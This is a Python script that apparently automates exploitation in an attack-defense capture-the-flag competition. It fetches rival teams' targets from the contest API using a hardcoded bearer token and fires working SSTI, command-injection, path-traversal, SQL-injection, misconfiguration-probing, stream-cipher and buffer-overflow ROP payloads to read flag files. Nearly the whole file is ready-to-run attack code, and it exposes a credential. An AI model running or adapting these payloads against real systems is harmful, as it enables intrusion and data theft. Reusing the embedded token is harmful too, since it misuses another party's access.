#!/usr/bin/env python3
# jcc_final.py - low-noise, 3 req/target, cover 6 vuln class
import requests, re, socket, struct, hashlib, base64, json
import concurrent.futures as cf

requests.packages.urllib3.disable_warnings()

BASE_API = "https://jcc.jatimprov.go.id/api"
GAME_ID  = 5
TOKEN    = "ad_srC7r2tIqEB4LKTpjzpzKKndATZR0Bk05FYluXtFR8k"
HEADERS  = {"Authorization": f"Bearer {TOKEN}", "User-Agent": "Mozilla/5.0"}
TIMEOUT  = (1.5, 3.0)
SAVE     = "flags.txt"

FLAG_RE = re.compile(r"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
FLAG_BY = re.compile(rb"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
CRYPTO_KEY = hashlib.sha256(b"simple-crypto-fixed-stream").digest()

def get_targets(title):
    r = requests.get(f"{BASE_API}/Game/{GAME_ID}/Ad/Targets",
                     headers=HEADERS, timeout=10)
    r.raise_for_status()
    return [(t["teamName"], t["ip"], int(t["port"]))
            for ch in r.json()["challenges"] if ch["title"] == title
            for t in ch["teams"] if t.get("ip") and t.get("port")]

# ====================================================================
# REQUEST #1 — FINGERPRINT (1 req, parse semaksimal mungkin)
# ====================================================================
def fingerprint(base):
    """1 GET ke root. Parse HTML, headers, form, hints."""
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0"})
    except Exception:
        return None

    body = r.text[:65536]
    low  = body.lower()
    hdr  = {k.lower(): v for k, v in r.headers.items()}

    # Deteksi form & input dari HTML (tanpa request tambahan)
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.I)
    actions = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.I)
    textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', body, re.I)
    paths = set(re.findall(r'href=["\'](/[^"\']+)["\']', body))

    # Klasifikasi berdasarkan isi
    hints = set()
    if "flask" in low or "jinja" in low or "werkzeug" in low: hints.add("flask")
    if "express" in low or "node" in hdr.get("x-powered-by",""): hints.add("node")
    if "php" in hdr.get("x-powered-by",""): hints.add("php")
    if "django" in low: hints.add("django")
    if "spring" in low or "actuator" in low: hints.add("spring")
    if "preview" in low and ("template" in low or "render" in low): hints.add("ssti-likely")
    if "search" in low or "login" in low: hints.add("form-likely")

    return {
        "status": r.status_code,
        "headers": hdr,
        "body": body,
        "forms": list(set(forms)),
        "fields": set(actions + textareas),
        "paths": paths,
        "hints": hints,
    }

# ====================================================================
# REQUEST #2 — SMART EXPLOIT (pilih 1 dari 6 vuln, 1 payload)
# ====================================================================
def exploit(base, fp):
    """Pilih 1 teknik berdasarkan fingerprint. 1 request, tepat sasaran."""
    hints = fp["hints"]

    # ---- Prioritas 1: SSTI (kalau ada hint) ----
    if "ssti-likely" in hints or "flask" in hints:
        for ep in ["/preview", "/render", "/"]:
            flag = _try_ssti(base, ep, fp["fields"] or {"template", "name"})
            if flag: return ("SSTI", flag)

    # ---- Prioritas 2: CMDi (kalau ada field suspicious) ----
    suspicious = {"cmd", "exec", "ping", "host", "ip", "target", "url", "input"}
    if suspicious & fp["fields"]:
        for ep in ["/", "/api/exec", "/run"]:
            flag = _try_cmdi(base, ep, fp["fields"] & suspicious)
            if flag: return ("CMDi", flag)

    # ---- Prioritas 3: LFI (kalau ada field file/path) ----
    lfi_fields = {"file", "path", "page", "load", "view", "read", "download"}
    if lfi_fields & fp["fields"]:
        for ep in ["/", "/download", "/view"]:
            flag = _try_lfi(base, ep, fp["fields"] & lfi_fields)
            if flag: return ("LFI", flag)

    # ---- Prioritas 4: SQLi (form dengan user/pass) ----
    if "form-likely" in hints or {"username","user","email","id"} & fp["fields"]:
        for ep in ["/login", "/api/login", "/search", "/"]:
            flag = _try_sqli(base, ep)
            if flag: return ("SQLi", flag)

    # ---- Prioritas 5: Misconfig (path exposed dari HTML) ----
    flag = _try_misconfig(base, fp["paths"])
    if flag: return ("Misconfig", flag)

    # ---- Prioritas 6: SSTI universal fallback (kalau hint gagal) ----
    for ep in ["/preview", "/"]:
        flag = _try_ssti(base, ep, {"template", "name"})
        if flag: return ("SSTI", flag)

    return None

# ====================================================================
# DETEKTOR — masing-masing 1 request
# ====================================================================
def _try_ssti(base, ep, fields):
    """Payload universal: request.application — Flask context, gak keyword aneh."""
    payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}"
    field = "template" if "template" in fields else next(iter(fields), "name")
    try:
        # POST dulu (form-based)
        r = requests.post(f"{base}{ep}",
                          data={field: payload, "name": "x"},
                          timeout=TIMEOUT, verify=False)
        m = FLAG_RE.search(r.text)
        if m: return m.group(0)
        # GET fallback (query)
        r = requests.get(f"{base}{ep}", params={field: payload},
                         timeout=TIMEOUT, verify=False)
        m = FLAG_RE.search(r.text)
        if m: return m.group(0)
    except Exception:
        pass
    return None

def _try_cmdi(base, ep, fields):
    """Payload: ;cat$IFS/flag* — bypass spasi pakai $IFS."""
    for field in fields:
        for sep in [";", "|", "&&"]:
            try:
                r = requests.get(f"{base}{ep}",
                                 params={field: f"{sep}cat$IFS/flag*"},
                                 timeout=TIMEOUT, verify=False)
                m = FLAG_RE.search(r.text)
                if m: return m.group(0)
            except Exception:
                continue
    return None

def _try_lfi(base, ep, fields):
    """Payload: ....//....//flag — double-dot bypass filter."""
    for field in fields:
        for payload in ["....//....//....//flag",
                        "php://filter/convert.base64-encode/resource=/flag"]:
            try:
                r = requests.get(f"{base}{ep}",
                                 params={field: payload},
                                 timeout=TIMEOUT, verify=False)
                m = FLAG_RE.search(r.text)
                if m: return m.group(0)
                if "php://filter" in payload:
                    b64 = re.search(r"[A-Za-z0-9+/=]{40,}", r.text)
                    if b64:
                        try:
                            dec = base64.b64decode(b64.group(0)).decode()
                            m = FLAG_RE.search(dec)
                            if m: return m.group(0)
                        except Exception:
                            pass
            except Exception:
                continue
    return None

def _try_sqli(base, ep):
    """Payload: 1'/**/OR/**/'1'='1 — bypass WAF pakai comment."""
    payload = "1'/**/OR/**/'1'='1"
    try:
        r = requests.post(f"{base}{ep}",
                          data={"username": payload, "password": payload, "id": payload},
                          timeout=TIMEOUT, verify=False)
        m = FLAG_RE.search(r.text)
        if m: return m.group(0)
        # Union select
        exploit = "1'/**/UNION/**/SELECT/**/flag/**/FROM/**/flags--/**/-"
        r2 = requests.post(f"{base}{ep}",
                           data={"username": exploit, "password": "x", "id": exploit},
                           timeout=TIMEOUT, verify=False)
        m = FLAG_RE.search(r2.text)
        if m: return m.group(0)
    except Exception:
        pass
    return None

def _try_misconfig(base, paths):
    """Cek path yang muncul di HTML + common exposed endpoints."""
    common = {"/.env", "/.git/config", "/actuator/env", "/debug", "/console"}
    for path in list(paths | common)[:8]:  # max 8 path
        try:
            r = requests.get(f"{base}{path}", timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                m = FLAG_RE.search(r.text)
                if m: return m.group(0)
                if "flag" in r.text.lower():
                    m = FLAG_RE.search(r.text)
                    if m: return m.group(0)
        except Exception:
            continue
    return None

# ====================================================================
# ATTACK TARGET — max 3 request (fingerprint + 2 exploit attempts)
# ====================================================================
def attack_target(target):
    team, ip, port = target
    base = f"http://{ip}:{port}"

    # Request #1: fingerprint
    fp = fingerprint(base)
    if not fp: return None

    # Request #2: exploit (tunggal, tepat sasaran)
    result = exploit(base, fp)
    if result:
        vuln, flag = result
        return (team, vuln, flag)

    return None

# ====================================================================
# CRYPTO — 2 request per target (get + oracle)
# ====================================================================
def attack_crypto(target):
    team, ip, port = target
    base = f"http://{ip}:{port}"
    s = requests.Session(); s.verify = False
    try:
        blob = bytes.fromhex(s.get(f"{base}/api/flag", timeout=2).json()["ciphertext"])
    except Exception:
        return None
    if not blob: return None

    known = b"A" * min(len(blob), 512)
    try:
        ks = bytes.fromhex(s.post(f"{base}/api/encrypt",
                                  json={"message": known.decode('latin1')},
                                  timeout=2).json()["ciphertext"])
    except Exception:
        return None

    # Varian A: keystream reuse
    if len(ks) == len(blob):
        flag = bytes(a ^ b ^ c for a, b, c in zip(blob, ks, known))
        m = FLAG_BY.search(flag)
        if m: return (team, "CRYPTO", m.group(0).decode())
    # Varian B: IV + derivable KEY
    if len(ks) == len(known) + 16:
        iv, body = blob[:16], blob[16:]
        dyn = hashlib.sha256(CRYPTO_KEY + iv).digest()
        flag = bytes(b ^ dyn[i % 32] for i, b in enumerate(body))
        m = FLAG_BY.search(flag)
        if m: return (team, "CRYPTO", m.group(0).decode())
    return None

# ====================================================================
# PWN — 1 request (socket)
# ====================================================================
def attack_pwn(target):
    team, ip, port = target
    try:
        s = socket.create_connection((ip, port), timeout=3)
        s.settimeout(3)
        buf = b""
        while b"name:" not in buf:
            ch = s.recv(4096)
            if not ch: break
            buf += ch
        s.sendall(b"A"*72 + struct.pack("<Q", 0x4012a3) + struct.pack("<Q", 0x4011b6))
        data = b""
        try:
            while True:
                ch = s.recv(4096)
                if not ch: break
                data += ch
        except socket.timeout: pass
        s.close()
        m = FLAG_BY.search(data)
        if m: return (team, "PWN", m.group(0).decode())
    except Exception:
        pass
    return None

# ====================================================================
# ORKESTRASI
# ====================================================================
def run_all(title, fn):
    try:
        targets = get_targets(title)
    except Exception as e:
        print(f"[!] {title}: {e}"); return {}
    if not targets: return {}

    found = {}
    with cf.ThreadPoolExecutor(max_workers=len(targets)) as ex:
        futs = {ex.submit(fn, t): t for t in targets}
        for fut in cf.as_completed(futs, timeout=90):
            try: res = fut.result(timeout=5)
            except: continue
            if res:
                team, vuln, flag = res
                found[team] = (vuln, flag)
                print(f"  [+] {vuln:8} {team}: {flag}", flush=True)
    return found

def main():
    all_flags = set()

    # 3 service paralel
    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        futs = {
            ex.submit(run_all, "simple-crypto", attack_crypto): "CRYPTO",
            ex.submit(run_all, "simple-web",    attack_target): "WEB",
            ex.submit(run_all, "simple-pwn",    attack_pwn):    "PWN",
        }
        for fut in cf.as_completed(futs, timeout=120):
            try:
                hits = fut.result()
                for _, (vuln, flag) in hits.items():
                    all_flags.add(flag)
            except Exception: pass

    for f in sorted(all_flags):
        print(f)
    with open(SAVE, "w") as fp:
        for f in sorted(all_flags):
            fp.write(f + "\n")

if __name__ == "__main__":
    main()